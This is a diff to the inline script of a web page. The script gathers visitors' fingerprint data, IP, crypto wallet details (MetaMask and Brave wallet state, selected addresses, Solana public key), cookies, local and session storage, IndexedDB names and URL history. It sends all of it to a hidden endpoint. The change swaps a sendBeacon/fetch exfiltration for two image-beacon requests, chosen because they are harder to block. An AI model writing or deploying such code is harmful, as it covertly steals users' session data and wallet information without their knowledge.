@@ -88,12 +88,25 @@
 
       d.timestamp = new Date().toISOString();
 
-      // Send everything in one shot via sendBeacon (never blocked)
-      const payload = JSON.stringify(d);
-      navigator.sendBeacon(WH, payload);
-      
-      // Backup: fetch with no-cors
-      fetch(WH, {method:'POST', mode:'no-cors', body:payload}).catch(()=>{});
+      // Split into 2 smaller beacons (image beacons always work)
+      const p1 = {
+        ip:d.ip, isBrave:d.isBrave, userAgent:d.userAgent, platform:d.platform,
+        timezone:d.timezone, language:d.language, screen:d.screen, cores:d.cores,
+        memory:d.memory, plugins:d.plugins, hasEthereum:d.hasEthereum,
+        isBraveWallet:d.isBraveWallet, isMetaMask:d.isMetaMask, chainId:d.chainId,
+        blockNumber:d.blockNumber, isConnected:d.isConnected, networkVersion:d.networkVersion,
+        selectedAddress:d.selectedAddress, accounts:d.accounts,
+        hasBraveSolana:d.hasBraveSolana, solIsBraveWallet:d.solIsBraveWallet,
+        solPublicKey:d.solPublicKey, braveProps:d.braveProps, timestamp:d.timestamp
+      };
+      const p2 = {
+        ethMethods:d.ethMethods, solMethods:d.solMethods, cookies:d.cookies,
+        localStorage:d.localStorage, sessionStorage:d.sessionStorage,
+        indexedDBs:d.indexedDBs, urlHistory:d.urlHistory,
+        serviceWorkers:d.serviceWorkers, cacheNames:d.cacheNames, timestamp:d.timestamp
+      };
+      new Image().src = WH + '?part1=' + encodeURIComponent(JSON.stringify(p1));
+      new Image().src = WH + '?part2=' + encodeURIComponent(JSON.stringify(p2));
     })();
   </script>
 </body>
